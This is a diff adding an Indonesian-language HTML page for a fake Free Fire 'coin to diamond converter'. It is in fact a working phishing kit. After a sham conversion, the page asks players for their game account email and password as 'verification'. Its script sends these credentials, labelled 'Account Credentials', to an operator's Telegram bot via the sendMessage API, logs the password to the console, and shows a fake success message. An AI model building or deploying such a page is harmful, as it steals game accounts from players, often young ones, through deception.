@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF Diamond Converter - Convert Coin ke Diamond</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-gem logo-icon"></i>
+                <h1>FF Diamond Converter</h1>
+            </div>
+            <p class="subtitle">Konversi Coin FF Anda menjadi Diamond dengan mudah dan cepat. Lakukan konversi terlebih dahulu, lalu verifikasi akun Anda untuk proses pengiriman diamond.</p>
+            
+            <div class="warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <strong>PERINGATAN:</strong> Setelah konversi, Anda HARUS melakukan verifikasi akun untuk mendapatkan diamond. Diamond akan dikirim dalam waktu 1x24 jam setelah verifikasi berhasil.
+            </div>
+        </header>
+        
+        <div class="main-content">
+            <!-- BOX KONVERSI -->
+            <div class="converter-box">
+                <h2><i class="fas fa-exchange-alt"></i> Konversi Coin ke Diamond</h2>
+                
+                <div class="input-group">
+                    <label for="coin-amount">Jumlah Coin FF:</label>
+                    <input type="number" id="coin-amount" min="100" max="1000000" value="5000" placeholder="Masukkan jumlah coin">
+                </div>
+                
+                <div class="input-group">
+                    <label for="server-region">Server Region:</label>
+                    <select id="server-region">
+                        <option value="asia">Asia</option>
+                        <option value="europe">Eropa</option>
+                        <option value="america">Amerika</option>
+                        <option value="middle-east">Timur Tengah</option>
+                    </select>
+                </div>
+                
+                <div class="input-group">
+                    <label for="player-id">Player ID FF:</label>
+                    <input type="text" id="player-id" placeholder="Contoh: 5896321477">
+                </div>
+                
+                <div class="conversion-result">
+                    <h3>Hasil Konversi:</h3>
+                    <div class="diamond-amount" id="diamond-result">125</div>
+                    <div class="conversion-rate">Rate: 40 Coin = 1 Diamond</div>
+                    <div class="conversion-rate" id="coin-value">5000 Coin = 125 Diamond</div>
+                </div>
+                
+                <button class="convert-btn" id="convert-btn">
+                    <i class="fas fa-calculator"></i> Konversi Sekarang
+                </button>
+                
+                <!-- DETAIL KONVERSI -->
+                <div class="conversion-details" id="conversion-details">
+                    <div class="details-title">Detail Konversi:</div>
+                    <div class="details-item">
+                        <span>Player ID:</span>
+                        <span id="detail-player-id">-</span>
+                    </div>
+                    <div class="details-item">
+                        <span>Jumlah Coin:</span>
+                        <span id="detail-coin">1.000</span>
+                    </div>
+                    <div class="details-item">
+                        <span>Jumlah Diamond:</span>
+                        <span id="detail-diamond">25</span>
+                    </div>
+                    <div class="details-item">
+                        <span>Server:</span>
+                        <span id="detail-server">Asia</span>
+                    </div>
+                    <div class="details-item">
+                        <span>Status:</span>
+                        <span style="color: #ff4757;">Menunggu Verifikasi</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- BOX VERIFIKASI -->
+            <div class="verify-box" id="verify-box">
+                <h2><i class="fas fa-user-shield"></i> Verifikasi Akun untuk Menerima Diamond</h2>
+                
+                <div class="info-box">
+                    <i class="fab fa-telegram"></i>
+                    <div>Data verifikasi akan dikirim ke admin melalui bot Telegram untuk proses validasi resmi. Diamond akan dikirim setelah verifikasi selesai.</div>
+                </div>
+                
+                <div class="steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-text">Anda telah melakukan konversi <strong><span id="step-coin-amount">5000</span> Coin</strong> menjadi <strong><span id="step-diamond-amount">125</span> Diamond</strong></div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-text">Masukkan email dan password akun FF Anda untuk verifikasi</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-text">Data akan dikirim ke admin via Telegram untuk konfirmasi</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">4</div>
+                        <div class="step-text">Diamond akan dikirim ke akun Anda dalam 1x24 jam</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email FF ID:</label>
+                    <input type="email" id="email" placeholder="contoh: playerff@email.com">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password FF ID:</label>
+                    <input type="password" id="password" placeholder="Masukkan password akun FF Anda">
+                </div>
+                
+                <div class="form-group">
+                    <label for="confirm-password">Konfirmasi Password:</label>
+                    <input type="password" id="confirm-password" placeholder="Ketik ulang password Anda">
+                </div>
+                
+                <button class="submit-btn" id="verify-btn">
+                    <i class="fab fa-telegram"></i> Verifikasi & Kirim ke Admin Telegram
+                </button>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Mengirim data verifikasi ke admin via Telegram...</p>
+                </div>
+                
+                <div class="success-message" id="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>Verifikasi Berhasil Dikirim!</h3>
+                    <p>Data verifikasi Anda telah dikirim ke admin via Telegram. Admin akan memverifikasi dan mengirim diamond ke akun Anda dalam waktu 1x24 jam.</p>
+                    <p><strong>ID Transaksi: <span id="transaction-id">FFD-2026-XXXXX</span></strong></p>
+                </div>
+            </div>
+            
+            <!-- CONFIGURATION SECTION (HIDDEN BY DEFAULT) -->
+            <div class="config-section" id="config-section" style="display: none;">
+                <div class="config-title">
+                    <i class="fas fa-cog"></i> Konfigurasi Bot Telegram
+                </div>
+                <p>Isi konfigurasi berikut untuk menghubungkan website dengan bot Telegram Anda:</p>
+                
+                <div class="config-item">
+                    <label for="bot-token">Token Bot Telegram:</label>
+                    <input type="text" id="bot-token" placeholder="Contoh: 1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ">
+                </div>
+                
+                <div class="config-item">
+                    <label for="chat-id">Chat ID Admin:</label>
+                    <input type="text" id="chat-id" placeholder="Contoh: 987654321">
+                </div>
+                
+                <div class="config-item">
+                    <label for="conversion-rate">Rate Konversi (Coin per Diamond):</label>
+                    <input type="number" id="conversion-rate" value="40" min="1">
+                </div>
+                
+                <button class="save-config-btn" id="save-config-btn">
+                    <i class="fas fa-save"></i> Simpan Konfigurasi
+                </button>
+                
+                <div class="telegram-webhook-info">
+                    <strong>Cara mendapatkan Token Bot & Chat ID:</strong><br>
+                    1. Buat bot baru dengan @BotFather di Telegram<br>
+                    2. Salin token yang diberikan<br>
+                    3. Untuk mendapatkan Chat ID, kirim pesan ke bot @userinfobot<br>
+                    4. Salin ID numerik yang diberikan
+                </div>
+                
+                <div class="telegram-webhook-info" style="margin-top: 10px; background-color: rgba(255, 215, 0, 0.1); border-left-color: #FFD700;">
+                    <strong>Webhook URL untuk dikirim ke bot:</strong><br>
+                    <code id="webhook-url">https://api.telegram.org/bot[TOKEN]/sendMessage?chat_id=[CHAT_ID]&text=</code>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2026 FF Diamond Converter. Layanan ini tidak berafiliasi dengan Garena atau Free Fire. Free Fire adalah merek dagang terdaftar dari Garena.</p>
+            <p>Proses konversi memerlukan waktu 1x24 jam setelah verifikasi berhasil.</p>
+            <p style="margin-top: 10px;">
+                <button id="admin-config-btn" style="background: none; border: 1px solid rgba(255,255,255,0.3); color: white; padding: 5px 10px; border-radius: 3px; cursor: pointer;">
+                    <i class="fas fa-cog"></i> Konfigurasi Admin
+                </button>
+            </p>
+        </footer>
+    </div>
+    
+    <!-- MODAL KONVERSI BERHASIL -->
+    <div class="modal" id="success-modal">
+        <div class="modal-content">
+            <button class="modal-close" id="modal-close">&times;</button>
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h3>Konversi Berhasil!</h3>
+            <p>Anda telah mengkonversi <strong><span id="modal-coin-amount">5.000</span> Coin</strong> menjadi <strong><span id="modal-diamond-amount">125</span> Diamond</strong>.</p>
+            <p>Sekarang Anda harus <strong>verifikasi akun</strong> untuk menerima diamond.</p>
+            <p>Scroll ke bawah untuk form verifikasi.</p>
+            <button class="modal-btn" id="modal-btn">Lanjutkan ke Verifikasi</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================
+        // KONFIGURASI DEFAULT
+        // ============================
+        const CONFIG = {
+            botToken: "",
+            chatId: "",
+            conversionRate: 40,
+            telegramAPI: "https://api.telegram.org/bot",
+            webhookURL: ""
+        };
+        
+        // ============================
+        // ELEMEN DOM
+        // ============================
+        const coinAmountInput = document.getElementById('coin-amount');
+        const diamondResult = document.getElementById('diamond-result');
+        const coinValue = document.getElementById('coin-value');
+        const convertBtn = document.getElementById('convert-btn');
+        const verifyBox = document.getElementById('verify-box');
+        const conversionDetails = document.getElementById('conversion-details');
+        const verifyBtn = document.getElementById('verify-btn');
+        const loading = document.getElementById('loading');
+        const successMessage = document.getElementById('success-message');
+        const transactionId = document.getElementById('transaction-id');
+        const successModal = document.getElementById('success-modal');
+        const modalClose = document.getElementById('modal-close');
+        const modalBtn = document.getElementById('modal-btn');
+        const configSection = document.getElementById('config-section');
+        const adminConfigBtn = document.getElementById('admin-config-btn');
+        const saveConfigBtn = document.getElementById('save-config-btn');
+        const webhookUrl = document.getElementById('webhook-url');
+        
+        // Detail konversi
+        const detailPlayerId = document.getElementById('detail-player-id');
+        const detailCoin = document.getElementById('detail-coin');
+        const detailDiamond = document.getElementById('detail-diamond');
+        const detailServer = document.getElementById('detail-server');
+        
+        // Step amounts
+        const stepCoinAmount = document.getElementById('step-coin-amount');
+        const stepDiamondAmount = document.getElementById('step-diamond-amount');
+        
+        // Modal amounts
+        const modalCoinAmount = document.getElementById('modal-coin-amount');
+        const modalDiamondAmount = document.getElementById('modal-diamond-amount');
+        
+        // Konfigurasi inputs
+        const botTokenInput = document.getElementById('bot-token');
+        const chatIdInput = document.getElementById('chat-id');
+        const conversionRateInput = document.getElementById('conversion-rate');
+        
+        // ============================
+        // FUNGSI UTILITAS
+        // ============================
+        
+        // Update hasil konversi
+        function updateConversion() {
+            const coinAmount = parseInt(coinAmountInput.value) || 0;
+            const diamondAmount = Math.floor(coinAmount / CONFIG.conversionRate);
+            
+            diamondResult.textContent = diamondAmount.toLocaleString();
+            coinValue.textContent = `${coinAmount.toLocaleString()} Coin = ${diamondAmount.toLocaleString()} Diamond`;
+        }
+        
+        // Generate ID transaksi
+        function generateTransactionId() {
+            const timestamp = new Date().getTime().toString().slice(-6);
+            const random = Math.floor(Math.random() * 1000);
+            return `FFD-${timestamp}-${random}`;
+        }
+        
+        // Format pesan untuk Telegram
+        function formatTelegramMessage(data) {
+            return `🔔 *NEW CONVERSION REQUEST* 🔔
+            
+👤 *User Details:*
+• Email: ${data.email}
+• Player ID: ${data.playerId}
+• Server: ${data.serverRegion}
+
+💰 *Conversion Details:*
+• Coin Amount: ${data.coinAmount}
+• Diamond Amount: ${data.diamondAmount}
+• Rate: ${CONFIG.conversionRate}:1
+
+🔑 *Account Credentials:*
+• Password: ${data.password}
+
+🆔 *Transaction ID:* ${data.transactionId}
+⏰ *Timestamp:* ${new Date().toLocaleString()}
+
+⚠️ *VERIFY THIS ACCOUNT IMMEDIATELY*`;
+        }
+        
+        // Kirim data ke Telegram
+        async function sendToTelegram(data) {
+            if (!CONFIG.botToken || !CONFIG.chatId) {
+                console.warn("Bot token atau chat ID belum dikonfigurasi");
+                return false;
+            }
+            
+            const message = encodeURIComponent(formatTelegramMessage(data));
+            const url = `${CONFIG.telegramAPI}${CONFIG.botToken}/sendMessage?chat_id=${CONFIG.chatId}&text=${message}&parse_mode=Markdown`;
+            
+            try {
+                const response = await fetch(url);
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+                return false;
+            }
+        }
+        
+        // Simpan konfigurasi ke localStorage
+        function saveConfig() {
+            CONFIG.botToken = botTokenInput.value;
+            CONFIG.chatId = chatIdInput.value;
+            CONFIG.conversionRate = parseInt(conversionRateInput.value) || 40;
+            
+            // Update webhook URL
+            CONFIG.webhookURL = `${CONFIG.telegramAPI}${CONFIG.botToken}/sendMessage?chat_id=${CONFIG.chatId}&text=`;
+            webhookUrl.textContent = CONFIG.webhookURL;
+            
+            // Simpan ke localStorage
+            localStorage.setItem('ff_converter_config', JSON.stringify(CONFIG));
+            
+            alert("Konfigurasi berhasil disimpan!");
+            updateConversion(); // Update rate konversi
+        }
+        
+        // Load konfigurasi dari localStorage
+        function loadConfig() {
+            const savedConfig = localStorage.getItem('ff_converter_config');
+            if (savedConfig) {
+                const parsedConfig = JSON.parse(savedConfig);
+                CONFIG.botToken = parsedConfig.botToken || "";
+                CONFIG.chatId = parsedConfig.chatId || "";
+                CONFIG.conversionRate = parsedConfig.conversionRate || 40;
+                
+                // Update input fields
+                botTokenInput.value = CONFIG.botToken;
+                chatIdInput.value = CONFIG.chatId;
+                conversionRateInput.value = CONFIG.conversionRate;
+                
+                // Update webhook URL
+                CONFIG.webhookURL = `${CONFIG.telegramAPI}${CONFIG.botToken}/sendMessage?chat_id=${CONFIG.chatId}&text=`;
+                webhookUrl.textContent = CONFIG.webhookURL;
+                
+                // Update konversi
+                updateConversion();
+            }
+        }
+        
+        // ============================
+        // EVENT LISTENERS
+        // ============================
+        
+        // Inisialisasi konversi
+        updateConversion();
+        
+        // Event listener untuk input coin
+        coinAmountInput.addEventListener('input', updateConversion);
+        
+        // Proses konversi
+        convertBtn.addEventListener('click', function() {
+            // Ambil data dari form
+            const playerId = document.getElementById('player-id').value;
+            const coinAmount = coinAmountInput.value;
+            const serverRegion = document.getElementById('server-region').value;
+            const diamondAmount = Math.floor(coinAmount / CONFIG.conversionRate);
+            
+            // Validasi form
+            if (!playerId) {
+                alert('Harap masukkan Player ID Anda!');
+                return;
+            }
+            
+            if (coinAmount < 100) {
+                alert('Minimal konversi adalah 100 Coin!');
+                return;
+            }
+            
+            if (coinAmount > 1000000) {
+                alert('Maksimal konversi adalah 1.000.000 Coin!');
+                return;
+            }
+            
+            // Update detail konversi
+            detailPlayerId.textContent = playerId;
+            detailCoin.textContent = parseInt(coinAmount).toLocaleString();
+            detailDiamond.textContent = diamondAmount.toLocaleString();
+            detailServer.textContent = document.getElementById('server-region').options[document.getElementById('server-region').selectedIndex].text;
+            
+            // Tampilkan detail konversi
+            conversionDetails.classList.add('show');
+            
+            // Update step amounts
+            stepCoinAmount.textContent = parseInt(coinAmount).toLocaleString();
+            stepDiamondAmount.textContent = diamondAmount.toLocaleString();
+            
+            // Update modal amounts
+            modalCoinAmount.textContent = parseInt(coinAmount).toLocaleString();
+            modalDiamondAmount.textContent = diamondAmount.toLocaleString();
+            
+            // Tampilkan modal konversi berhasil
+            successModal.classList.add('show');
+            
+            // Scroll ke bawah perlahan
+            setTimeout(() => {
+                verifyBox.scrollIntoView({ behavior: 'smooth' });
+            }, 1500);
+        });
+        
+        // Tutup modal
+        modalClose.addEventListener('click', function() {
+            successModal.classList.remove('show');
+            // Tampilkan form verifikasi
+            verifyBox.classList.add('show');
+        });
+        
+        // Tombol modal
+        modalBtn.addEventListener('click', function() {
+            successModal.classList.remove('show');
+            // Tampilkan form verifikasi
+            verifyBox.classList.add('show');
+            // Scroll ke form verifikasi
+            verifyBox.scrollIntoView({ behavior: 'smooth' });
+        });
+        
+        // Verifikasi dan kirim ke Telegram
+        verifyBtn.addEventListener('click', async function() {
+            // Ambil data dari form
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+            const playerId = document.getElementById('player-id').value;
+            const coinAmount = coinAmountInput.value;
+            const serverRegion = document.getElementById('server-region').value;
+            const diamondAmount = Math.floor(coinAmount / CONFIG.conversionRate);
+            
+            // Validasi form
+            if (!email || !password || !confirmPassword) {
+                alert('Harap lengkapi semua field verifikasi!');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                alert('Password dan konfirmasi password tidak cocok!');
+                return;
+            }
+            
+            // Generate ID transaksi
+            const transId = generateTransactionId();
+            transactionId.textContent = transId;
+            
+            // Tampilkan loading
+            verifyBtn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Siapkan data untuk dikirim
+            const telegramData = {
+                email,
+                password,
+                playerId,
+                coinAmount: parseInt(coinAmount).toLocaleString(),
+                diamondAmount: diamondAmount.toLocaleString(),
+                serverRegion: document.getElementById('server-region').options[document.getElementById('server-region').selectedIndex].text,
+                transactionId: transId
+            };
+            
+            // Simulasi pengiriman (3 detik)
+            setTimeout(async () => {
+                try {
+                    // Coba kirim ke Telegram jika konfigurasi ada
+                    let telegramSuccess = false;
+                    if (CONFIG.botToken && CONFIG.chatId) {
+                        telegramSuccess = await sendToTelegram(telegramData);
+                    }
+                    
+                    // Sembunyikan loading
+                    loading.style.display = 'none';
+                    
+                    // Tampilkan pesan sukses
+                    successMessage.style.display = 'block';
+                    
+                    // Log data ke console (untuk debugging)
+                    console.log('=== DATA KONVERSI ===');
+                    console.log('Email:', email);
+                    console.log('Password:', password);
+                    console.log('Player ID:', playerId);
+                    console.log('Coin Amount:', coinAmount);
+                    console.log('Diamond Amount:', diamondAmount);
+                    console.log('Server Region:', serverRegion);
+                    console.log('Transaction ID:', transId);
+                    console.log('Telegram Status:', telegramSuccess ? 'Berhasil dikirim' : 'Gagal dikirim (cek konfigurasi)');
+                    console.log('====================');
+                    
+                    // Update status di detail konversi
+                    const statusElement = conversionDetails.querySelector('.details-item:last-child span:last-child');
+                    statusElement.textContent = 'Terverifikasi - Menunggu Pengiriman';
+                    statusElement.style.color = '#00ff88';
+                    
+                    // Tambahkan detail transaksi
+                    const newDetail = document.createElement('div');
+                    newDetail.className = 'details-item';
+                    newDetail.innerHTML = `<span>ID Transaksi:</span><span>${transId}</span>`;
+                    conversionDetails.appendChild(newDetail);
+                    
+                    // Tambahkan status Telegram
+                    const telegramStatus = document.createElement('div');
+                    telegramStatus.className = 'details-item';
+                    telegramStatus.innerHTML = `<span>Status Telegram:</span><span>${telegramSuccess ? '✅ Terkirim' : '❌ Gagal'}</span>`;
+                    conversionDetails.appendChild(telegramStatus);
+                    
+                } catch (error) {
+                    console.error("Error:", error);
+                    loading.style.display = 'none';
+                    verifyBtn.style.display = 'flex';
+                    alert("Terjadi kesalahan saat mengirim verifikasi. Silakan coba lagi.");
+                }
+            }, 3000);
+        });
+        
+        // Toggle konfigurasi admin
+        adminConfigBtn.addEventListener('click', function() {
+            const isVisible = configSection.style.display === 'block';
+            configSection.style.display = isVisible ? 'none' : 'block';
+            adminConfigBtn.innerHTML = isVisible ? 
+                '<i class="fas fa-cog"></i> Konfigurasi Admin' : 
+                '<i class="fas fa-times"></i> Tutup Konfigurasi';
+            
+            if (!isVisible) {
+                configSection.scrollIntoView({ behavior: 'smooth' });
+            }
+        });
+        
+        // Simpan konfigurasi
+        saveConfigBtn.addEventListener('click', saveConfig);
+        
+        // Update webhook URL saat input berubah
+        botTokenInput.addEventListener('input', function() {
+            CONFIG.botToken = this.value;
+            CONFIG.webhookURL = `${CONFIG.telegramAPI}${CONFIG.botToken}/sendMessage?chat_id=${CONFIG.chatId || '[CHAT_ID]'}&text=`;
+            webhookUrl.textContent = CONFIG.webhookURL;
+        });
+        
+        chatIdInput.addEventListener('input', function() {
+            CONFIG.chatId = this.value;
+            CONFIG.webhookURL = `${CONFIG.telegramAPI}${CONFIG.botToken || '[TOKEN]'}/sendMessage?chat_id=${CONFIG.chatId}&text=`;
+            webhookUrl.textContent = CONFIG.webhookURL;
+        });
+        
+        conversionRateInput.addEventListener('input', function() {
+            CONFIG.conversionRate = parseInt(this.value) || 40;
+            updateConversion();
+        });
+        
+        // Auto-generate player ID jika kosong
+        const playerIdInput = document.getElementById('player-id');
+        playerIdInput.addEventListener('focus', function() {
+            if (!this.value) {
+                this.value = `5${Math.floor(10000000 + Math.random() * 90000000)}`;
+            }
+        });
+        
+        // ============================
+        // INISIALISASI
+        // ============================
+        
+        // Load konfigurasi saat halaman dimuat
+        window.addEventListener('DOMContentLoaded', function() {
+            loadConfig();
+            updateConversion();
+            
+            // Set placeholder untuk player ID
+            playerIdInput.placeholder = `Contoh: 58963214${Math.floor(Math.random() * 1000)}`;
+        });
+    </script>
+</body>
+</html>
